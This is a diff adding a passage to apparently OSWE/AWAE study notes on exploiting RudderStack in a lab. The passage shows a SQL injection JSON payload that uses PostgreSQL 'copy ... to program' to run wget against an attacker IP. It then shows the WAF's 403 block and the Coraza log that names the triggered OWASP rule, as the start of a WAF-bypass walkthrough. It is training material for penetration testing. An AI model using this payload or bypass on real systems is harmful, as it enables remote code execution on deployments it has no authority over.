@@ -370,3 +370,34 @@ We now have a reverse shell.
 
 **Automation script:** [rce_script_noWAFbypass.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/RudderStack/rce_script_noWAFbypass.py)
 ## Bypassing a Web Application Firewall
+Let's try sending our SQL injection payload through the WAF. As a reminder, we're using the following JSON body as our proof of concept:
+```json
+{ "source_id":"'; copy (select 'a') to program 'wget -q http://192.168.45.203:1337/it_worked' -- - ", "task_run_id":"1"}
+```
+We receive:
+```text
+HTTP/1.1 403 Forbidden
+Server: Caddy
+Date: Fri, 01 Aug 2025 01:10:30 GMT
+Content-Length: 0
+
+
+```
+The application responded with HTTP `403 Forbidden` with a `Content-Length` of `0`. This response does not give us a lot to work with. Checking for different responses based on the values we send is one way we can attempt to identify if an application is behind a WAF. For example, if we send a single quote (`` ` ``) as the `source_id`, the application responds with an HTTP `500 Internal Server Error` with the verbose error message.
+
+However, if we include a single quote (`'`) followed by a semicolon (`';`), we receive the empty `403 Forbidden` response. This difference in response may be all that we have to identify that we're interacting with a WAF.
+
+Since we do have full access to the testing environment, let's review the Caddy logs to determine which rule we triggered.
+
+```
+student@rudder:~$ docker logs -n 5 student_caddy_1
+{"level":"debug","ts":1709242735.4946961,"logger":"http.handlers.reverse_proxy","msg":"selected upstream","dial":"backend:8080","total_upstreams":1}
+{"level":"debug","ts":1709242735.4958072,"logger":"http.handlers.reverse_proxy","msg":"upstream roundtrip","upstream":"backend:8080","duration":0.001060348,"request":{"remote_ip":"192.168.48.2","remote_port":"61683","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Content-Length":["42"],"Accept-Encoding":["gzip, deflate, br"],"X-Forwarded-For":["192.168.48.2"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"X-Forwarded-Proto":["http"],"Upgrade-Insecure-Requests":["1"],"Content-Type":["application/json"],"Accept-Language":["en-US,en;q=0.9"],"X-Forwarded-Host":["rudderstack:80"]}},"headers":{"Vary":["Origin"],"X-Content-Type-Options":["nosniff"],"Content-Length":["227"],"Content-Type":["text/plain; charset=utf-8"],"Date":["Thu, 29 Feb 2024 21:38:55 GMT"]},"status":500}
+{"level":"error","ts":1709242946.2066061,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Warning. SQL Authentication bypass (split query) [file \"/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf\"] [line \"9227\"] [id \"942540\"] [rev \"\"] [msg \"SQL Authentication bypass (split query)\"] [data \"Matched Data: '; found within ARGS:json.source_id: ';\"] [severity \"critical\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"application-multi\"] [tag \"language-multi\"] [tag \"platform-multi\"] [tag \"attack-sqli\"] [tag \"OWASP_CRS\"] [tag \"capec/1000/152/248/66\"] [tag \"PCI/6.5.2\"] [tag \"paranoia-level/1\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
+{"level":"error","ts":1709242946.2070546,"logger":"http.handlers.waf","msg":"[client \"192.168.48.2\"] Coraza: Access denied (phase 2). Inbound Anomaly Score Exceeded (Total Score: 5) [file \"/ruleset/rules/REQUEST-949-BLOCKING-EVALUATION.conf\"] [line \"11422\"] [id \"949110\"] [rev \"\"] [msg \"Inbound Anomaly Score Exceeded (Total Score: 5)\"] [data \"\"] [severity \"emergency\"] [ver \"OWASP_CRS/4.0.1-dev\"] [maturity \"0\"] [accuracy \"0\"] [tag \"anomaly-evaluation\"] [hostname \"\"] [uri \"/v1/warehouse/pending-events?triggerUpload=true\"] [unique_id \"DqHmPboMoGeARJPm\"]"}
+{"level":"debug","ts":1709242946.2072287,"logger":"http.log.error","msg":"interruption triggered","request":{"remote_ip":"192.168.48.2","remote_port":"61800","client_ip":"192.168.48.2","proto":"HTTP/1.1","method":"POST","host":"rudderstack:80","uri":"/v1/warehouse/pending-events?triggerUpload=true","headers":{"Accept":["text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],"Accept-Language":["en-US,en;q=0.9"],"Upgrade-Insecure-Requests":["1"],"User-Agent":["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36"],"Accept-Encoding":["gzip, deflate, br"],"Connection":["keep-alive"],"Content-Type":["application/json"],"Content-Length":["43"]}},"duration":0.003618809,"status":403,"err_id":"DqHmPboMoGeARJPm","err_trace":""}
+student@rudder:~$ 
+```
+The logs indicate our attack triggered the `"SQL Authentication bypass (split query)"` rule, which can be found in `/ruleset/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf`. We'll analyze this file in the next section to understand how the rule works.
+
+### Analyzing the WAF Ruleset
